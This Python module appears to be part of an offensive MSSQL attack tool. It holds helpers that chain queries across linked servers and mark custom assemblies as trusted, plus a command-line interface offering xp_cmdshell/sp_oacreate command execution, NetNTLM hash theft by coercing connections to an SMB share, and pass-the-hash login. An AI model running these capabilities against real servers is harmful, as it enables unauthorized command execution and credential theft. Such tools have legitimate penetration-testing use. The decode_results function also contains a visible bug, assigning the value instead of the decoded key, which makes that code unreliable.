import argparse
import binascii
import hashlib
from playbooks import Queries


def decode_results(list_of_results: list) -> [dict, list]:
    """
    This function is responsible to decode object content.
    """
    if isinstance(list_of_results, list):
        container = []
        for row in list_of_results:
            container.append(decode_results(row))
        return container
    if list_of_results and isinstance(list_of_results, dict):
        for key, value in list_of_results.items():
            if hasattr(type(key), 'decode'):
                key = value.decode()

            if hasattr(type(value), 'decode'):
                list_of_results[key] = value.decode()
        return list_of_results


def hexlify_file(file_location: str) -> str:
    """
    This function is responsible to convert a file to hex.
    """
    return f'0x{binascii.hexlify(open(file_location, "rb").read()).decode()}'


def remove_instance_from_server_name(server_name: str) -> str:
    """
    This function is responsible to remove the version from the server name.
    Example:
        ServerName\\InstanceName -> ServerName
    """
    if "\\" in server_name:
        return server_name.split("\\")[0]
    return server_name


def build_openquery(linked_server: str, query: str) -> str:
    """
    This function is responsible to embed a query within openquery.
    openquery executes a specified pass-through query on the specified linked server
    """
    query = query.replace("'", "''")
    return Queries.OPENQUERY.format(linked_server=linked_server, query=query)


def build_exec_at(linked_server: str, query: str) -> str:
    """
    This function is responsible to embed a query within a procedure (That can also contains a query)
    exec executes a command string or character string within a Transact-SQL batch.
    This function uses the "at" argument to refer the query to another linked server.
    """
    query = query.replace("'", "''")
    return Queries.EXEC_AT.format(linked_server=linked_server, query=query)


def return_result(status, replay, result):
    return {"is_success": status, "replay": replay, "results": result}


def calculate_sha512_hash(file_path: str) -> str:
    """
        This function is responsible to calculate the sha512 hash of a custom assembly in order to mark it as trusted.
        This operation is necessary to execute custom assemblies on the server using chained queries.
        This must be done since once we used chained query for custom assemblies,
        it cannot execute the procedure creation using chosen database,
        and that operation is necessary to create custom assemblies procedure in the master db.
    """
    sha512_hash = hashlib.sha512()
    with open(file_path, "rb") as f:
        while True:
            data = f.read()
            if not data:
                break
            sha512_hash.update(data)
    return f"0x{sha512_hash.hexdigest()}"


def generate_arg_parser():
    """
    This function is respponsible to manage the arguments passed to the script.
    """
    parser = argparse.ArgumentParser(add_help=True, description="TDS client implementation (SSL supported).")

    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-port', action='store', default='1433', help='target MSSQL port (default 1433)')
    parser.add_argument('-db', action='store', help='MSSQL database instance (default None)')
    parser.add_argument('-windows-auth', action='store_true', default=False, help='whether or not to use Windows '
                                                                                  'Authentication (default False)')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')

    group = parser.add_argument_group('authentication')

    group.add_argument('-hashes', action="store", metavar="LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true",
                       help='Use Kerberos authentication. Grabs credentials from ccache file '
                            '(KRB5CCNAME) based on target parameters. '
                            'If valid credentials cannot be found, it will use the '
                            'ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar="hex key", help='AES key to use for Kerberos Authentication '
                                                                          '(128 or 256 bits)')
    group.add_argument('-dc-ip', action='store', metavar="ip address", help='IP Address of the domain controller. If '
                                                                            'ommited it use the domain part (FQDN) '
                                                                            'specified in the target parameter')

    module = parser.add_argument_group('Choose module')
    module.add_argument("-link-server", help="Linked server to launch queries", default=None)
    module.add_argument("-max-recursive-links", help="Maximum links you want to scrape recursively", default=4,
                        type=int)

    subparser_1 = parser.add_subparsers(title='Command Execution', dest='module')
    subparser_1.add_parser('enumerate', help='Enumerate MSSQL server')
    command_execution = subparser_1.add_parser('exec', help='Command to execute')
    command_execution.add_argument("-command-execution-method", choices=['xp_cmdshell', 'sp_oacreate'],
                                   default='xp_cmdshell')
    command_execution.add_argument("command", help="Command to execute")

    ntlm_relay = subparser_1.add_parser('ntlm-relay', help='Steal NetNTLM hash / Relay attack')
    ntlm_relay.add_argument("smb_server", help="Steal NetNTLM hash / Relay attack (Example: \\\\192.168.1.1\\test)",
                            default=None)
    ntlm_relay.add_argument("-relay-method", choices=['xp_dirtree', 'xp_subdirs', 'xp_fileexist'],
                            default='xp_fileexist')

    custom_asm = subparser_1.add_parser('custom-asm', help='Execute procedures using custom assembly')
    custom_asm.add_argument("-arch", choices=['x86', 'x64'], default='x64')
    custom_asm.add_argument("-procedure_name", choices=['execute_command', 'run_query', 'run_query_system_service'],
                            default='execute_command')
    custom_asm.add_argument("command", help="Command to execute")

    direct_query = subparser_1.add_parser('direct_query', help='Execute direct query')
    direct_query.add_argument("query", help="Query to execute")
    direct_query.add_argument("-method", choices=['openquery', 'exec_at'], default='openquery')

    return parser
